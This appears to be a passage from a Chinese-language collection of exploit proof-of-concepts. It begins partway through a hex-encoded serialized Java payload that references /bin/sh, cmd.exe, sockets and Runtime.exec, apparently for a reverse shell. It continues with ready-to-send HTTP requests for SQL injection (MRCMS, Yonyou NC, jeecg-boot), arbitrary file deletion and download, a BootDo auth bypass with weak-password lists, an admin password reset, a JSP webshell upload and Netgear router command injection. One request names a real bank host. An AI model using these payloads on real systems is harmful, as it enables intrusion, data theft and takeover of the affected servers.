6e20340c0149011d0100022f63010005202d74203401000273680100022d6307014a0c014b014c0c008c014d0100116a6176612f7574696c2f5363616e6e657207014e0c014f01500c008301510100025c610c015201530c015401550c0156011d0c015701500c015800840100072f62696e2f73680c00830159010007636d642e6578650c008c015a01000f6a6176612f6e65742f536f636b65740c015b01220c0083015c0c015d015e0c015f01550701600c016101220c016201220701630c0164012d0c016500840c016601670c016801220c0169008401001d726576657273652065786563757465206572726f722c206d7367202d3e0c016a011d01000121010013726576657273652065786563757465206f6b210c008d008e010002413401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b01000e67657454687265616447726f757001001928294c6a6176612f6c616e672f54687265616447726f75703b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000d6765745375706572636c61737301000473697a650100032829490100152849294c6a6176612f6c616e672f4f626a6563743b0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010008676574427974657301000428295b42010004545950450100114c6a6176612f6c616e672f436c6173733b0100042849295601000b6e6577496e7374616e636501001428294c6a6176612f6c616e672f4f626a6563743b0100116765744465636c617265644d6574686f64010007666f724e616d65010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100156a6176612f6c616e672f436c6173734c6f61646572010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100047472696d01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a0100077265706c616365010044284c6a6176612f6c616e672f4368617253657175656e63653b4c6a6176612f6c616e672f4368617253657175656e63653b294c6a6176612f6c616e672f537472696e673b01000573706c6974010027284c6a6176612f6c616e672f537472696e673b295b4c6a6176612f6c616e672f537472696e673b0100087061727365496e74010015284c6a6176612f6c616e672f537472696e673b294901000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b010017284c6a6176612f6c616e672f52756e6e61626c653b295601000573746172740100106a6176612f6c616e672f53797374656d01000b67657450726f706572747901000b746f4c6f77657243617365010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e670100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b010018284c6a6176612f696f2f496e70757453747265616d3b295601000c75736544656c696d69746572010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f7574696c2f5363616e6e65723b0100076861734e65787401000328295a0100046e65787401000e6765744572726f7253747265616d01000764657374726f79010015284c6a6176612f6c616e672f537472696e673b2956010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b010008696e7456616c7565010016284c6a6176612f6c616e672f537472696e673b49295601000f6765744f757470757453747265616d01001828294c6a6176612f696f2f4f757470757453747265616d3b0100086973436c6f7365640100136a6176612f696f2f496e70757453747265616d010009617661696c61626c65010004726561640100146a6176612f696f2f4f757470757453747265616d0100057772697465010005666c757368010005736c656570010004284a29560100096578697456616c7565010005636c6f736501000a6765744d6573736167650021007e001d0001000f00020002007f008000000002008100820000000600010083008400020085000003d800080011000002982ab70001b80002b600034c2bb600041205b600064d2c04b600072c2bb60008c00009c000094e03360415042dbea2026a2d1504323a051905c70006a702561905b6000a3a061906120bb6000c9a000d1906120db6000c9a0006a702381905b60004120eb600064d2c04b600072c1905b600083a071907c1000f9a0006a702151907b600041210b600064d2c04b600072c1907b600083a071907b600041211b600064da700163a081907b60004b60013b600131211b600064d2c04b600072c1907b600083a071907b60004b600131214b600064da700103a081907b600041214b600064d2c04b600072c1907b600083a071907b600041215b600064d2c04b600072c1907b60008c00016c000163a0803360915091908b900170100a2016f19081509b9001802003a0a190ab600041219b600064d2c04b600072c190ab600083a0b190bb60004121a03bd001bb6001c190b03bd001db6001e3a0c190bb60004121f04bd001b5903122053b6001c190b04bd001d5903122153b6001ec000203a0d190dc70006a700ff2a190db60022b600233a0e190cb60004122404bd001b5903b2002553b6001c190c04bd001d5903bb0026591100c8b7002753b6001e572a1228b600293a0f190fb6002a3a07190f122b06bd001b5903122c535904b20025535905b2002553b6002d190706bd001d5903190e535904bb00265903b70027535905bb002659190ebeb7002753b6001e57190cb60004122e04bd001b5903190f53b6001c190c04bd001d5903190753b6001e57a7004f3a0f2a1230b600293a101910123104bd001b5903122c53b6002d191004bd001d5903190e53b6001e3a07190cb60004122e04bd001b5903191053b6001c190c04bd001d5903190753b6001e57a70017840901a7fe8ba700083a06a70003840401a7fd95b10008009700a200a5001200c500d300d6001201bd02310234002f0036003b028c002f003e0059028c002f005c007c028c002f007f0280028c002f02830289028c002f00010086000000ee003b0000000a0004000b000b000c0015000d001a000e002600100030001100360013003e001400450015005c001600670017006c001800740019007f001a008a001b008f001c0097001e00a2002100a5001f00a7002000b8002200bd002300c5002500d3002800d6002600d8002700e3002900e8002a00f0002b00fb002c0100002d010e002e011d002f0128003001330031013800320140003301590034017f003501840036018700380192003901bd003b01c5003c01cc003d020f003e023100430234003f02360040023e0041025e0042028000440283002e02890049028c0046028e0048029100100297004b0087000000040001002f000100880089000200850000003900020003000000112bb80032b04db80002b600342bb60035b000010000000400050033000100860000000e0003000000500005005100060052008700000004000100330001008a008b00010085000000b5000400040000006d2bc6000c12362bb600379900061238b02bb600394c2b123ab6003b99003e2b123a1236b6003c123db6003e4d2cbe059f0006123fb02a2c0332b500402a2c0432b80041b80042b50043bb0044592ab700454e2db600461247b02a2b123a1236b6003c12481236b6003cb60049b000000001008600000036000d00000058000d00590010005b0015005c001e005d002c005e0032005f00350061003c0062004900630052006400560065005900670001008c008b00010085000001ca000400090000012a124ab8004bb6004c4d2bb600394c014e013a042c124db6000c9900402b124eb6000c9900202b124fb6000c9a0017bb005059b700512bb600521253b60052b600544c06bd00205903122153590412555359052b533a04a7003d2b124eb6000c9900202b124fb6000c9a0017bb005059b700512bb600521256b60052b600544c06bd00205903125753590412585359052b533a04b800591904b6005a4ebb005b592db6005cb7005d125eb6005f3a051905b6006099000b1905b60061a7000512363a06bb005b592db60062b7005d125eb6005f3a05bb005059b700511906b600521905b6006099000b1905b60061a700051236b60052b600543a0619063a072dc600072db600631907b03a051905b600643a062dc600072db600631906b03a082dc600072db600631908bf0004009300fe0109002f009300fe011d000001090112011d0000011d011f011d0000000100860000006e001b0000006b0009006c000e006d0010006e0013006f001c0070002e00710042007300590075006b0076007f00780093007b009c007c00ae007d00c2007e00d4007f00fa008000fe0084010200850106008001090081010b00820112008401160085011a0082011d0084012300850001008d008e00010085000001830004000c000000f3124ab8004bb6004c124db6000c9a0010bb0020591265b700664ea7000dbb0020591267b700664eb800592db600683a04bb0069592b2cb6006ab7006b3a051904b6005c3a061904b600623a071905b6006c3a081904b6006d3a091905b6006e3a0a1905b6006f9a00601906b600709e0010190a1906b60071b60072a7ffee1907b600709e0010190a1907b60071b60072a7ffee1908b600709e001019091908b60071b60072a7ffee190ab600731909b60073140074b800761904b6007757a700083a0ba7ff9e1904b600631905b60078a700204ebb005059b700511279b600522db6007ab60052127bb60052b60054b0127cb0000200b800be00c1002f000000d000d3002f000100860000006e001b0000008e0010008f001d00910027009300300094003e009500530096006100970069009800710099007e009b0086009c0093009e009b009f00a800a100ad00a200b200a300b800a500be00a600c100a700c300a800c600aa00cb00ab00d000ae00d300ac00d400ad00f000af0001008f0084000100850000002a000300010000000e2a2ab400402ab40043b6007d57b10000000100860000000a0002000000b4000d00b50001009000000002009174000b646566696e65436c6173737571007e001a00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00287371007e00137571007e0018000000017571007e001a0000000071007e001c7571007e001a0000000171007e001e7371007e00137571007e0018000000017571007e00180000000071007e00227571007e001a0000000171007e00247371007e000f7371007e0000770c000000003f4000000000000078737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000001077080000001000000000787878)}}
```

## MRCMS 3.1.2 后台SQL注入漏洞

```
GET /admin/article.do?cid=1&did=0&status=1+and+extractvalue(1,concat(0x7e,(select+user()),0x7e))&keyword=1123&currentPageNo=1&pageSize=20 HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://localhost:8080/admin/index.do
Cookie: JSESSIONID=AD318CA555923823E93DC03659C2B5C0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```

https://github.com/wuweiit/mushroom/issues/19

## MRCMS 3.1.2 任意文件删除

```
GET /admin/file/delete.do?path=/&name=test.txt HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Content-Length: 0
```

https://github.com/wuweiit/mushroom/issues/20

## 万户OA  downloadhttp 任意文件下载漏洞

```
/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp
```

## BootDo 面向学习型的开源框架 获取用户列表

```
# 项目github：https://github.com/lcg0124/bootdo
# fofa：lcg0124/bootdo
# poc：
/;/sys/user/list

# 可能存在的弱口令：
rekkies	123456
vicky	123456
david	123456
bonnie	123456
maya	123456
david	123456
Isaac	123456
gdg	888888
lyh	111111
wjl	111111
ldh	111111
test	111111
wyf	111111
lh	111111
lyf	111111
ib_admin	111111

# 文件上传，不解析
POST /;/common/sysFile/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=490dfef5-db32-42b9-aee2-afc3357dc555
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Length: 554

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="file"; filename="123.txt"
Content-Type: image/jpeg

test
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```

https://mp.weixin.qq.com/s/jCcfVg1acQljefJevTewHw

## 用友 畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞

```
# 修改后的密码：admin/123qwe
POST /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd HTTP/1.1

{"pwdNew":"46f94c8de14fb36680850768ff1b7f2a"}
```

##  用友ERP-NC saveDoc.ajax 文件上传漏洞

```
POST /uapws/saveDoc.ajax?ws=/../../vul.jsp%00 HTTP/1.1
Host: test.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: 
X-Forwarded-For: 8.8.8.8
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 261

content=%3C%25new%20java.io.FileOutputStream%28application.getRealPath%28%22%2f%22%29%2b%22%2f%22%2brequest.getParameter%28%22f%22%29%29.write%28new%20sun.misc.BASE64Decoder%28%29.decodeBuffer%28request.getParameter%28%22c%22%29%29%29%3Bout.close%28%29%3B%25%3E
```

https://www.shungg.cn/225.html

## 用友ERP-NC ICurrtypeExportToCrmService SQL注入漏洞

```
# payload：1111' AND 7033=CONVERT(INT, (@@version+'~~'+db_name()))-- Mwnm
# 过waf HTML编码处理：1111' AND 7033=CONVERT(INT, (&#64;&#64;&#118;&#101;&#114;&#115;&#105;&#111;&#110;&#43;&apos;&#126;&#126;&apos;&#43;&#100;&#98;&#95;&#110;&#97;&#109;&#101;&#40;&#41;))-- Mwnm
POST /uapws/service/nc.itf.bd.crm.ICurrtypeExportToCrmService HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://test.com/uapws/service/nc.itf.bd.crm.ICurrtypeExportToCrmService?wsdl
Cookie: 
X-Forwarded-For: 8.8.8.8
Connection: keep-alive
Upgrade-Insecure-Requests: 1
SOAPAction: urn:exportCurrtypeToCrm
Content-Type: text/xml;charset=UTF-8
Host: purchase.cmbchina.com
Content-Length: 522

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:icur="http://crm.bd.itf.nc/ICurrtypeExportToCrmService"&gt;
   <soapenv:Header/>
   <soapenv:Body>
      <icur:exportCurrtypeToCrm>
         <!--type: string-->
         <string>>1111' AND 7033=CONVERT(INT, (&#64;&#64;&#118;&#101;&#114;&#115;&#105;&#111;&#110;&#43;&apos;&#126;&#126;&apos;&#43;&#100;&#98;&#95;&#110;&#97;&#109;&#101;&#40;&#41;))-- Mwnm </string>
      </icur:exportCurrtypeToCrm>
   </soapenv:Body>
</soapenv:Envelope>
```

https://www.shungg.cn/225.html

## netgear WNAP320路由器 boarddataww 存在命令执行漏洞

```
# fofa：title=="Netgear"
# 执行命令
POST /boardDataWW.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0

macAddress=112233445566%3Bwhoami+%3E+.%2Foutput+%23&reginfo=0&writeData=Submit

# 获取命令执行结果。
/output
```

## jeecg-boot 多个SQL注入漏洞 CVE-2022-45205

```
# 注入点1（需要登录？）：
/jeecg-boot/sys/dict/queryTableData?pageSize=100&table=information_schema.tables&text=table_name&code=TABLE_SCHEMA
/jeecg-boot/sys/dict/queryTableData?table=%60sys_user%60&pageSize=22&pageNo=1&text=username&code=password

# 注入点2（需要登录？）：
/jeecg-boot/sys/duplicate/check?dataId=2000&fieldName=(select(if(((select/*%0A*/password/*%0A*/from/*%0A*/sys_user/*%0A*/where/*%0A*/username/*%0A*/='jeecg')='eee378a1258530cb'),sleep(4),1)))&fieldVal=1000&tableName=sys_log

# 注入点3（该接口没有进行签名校验）：
/jeecg-boot/sys/api/getDictItems?dictCode=sys_user%20,username,password
```

https://github.com/jeecgboot/jeecg-boot/issues/4128

https://github.com/jeecgboot/jeecg-boot/issues/4393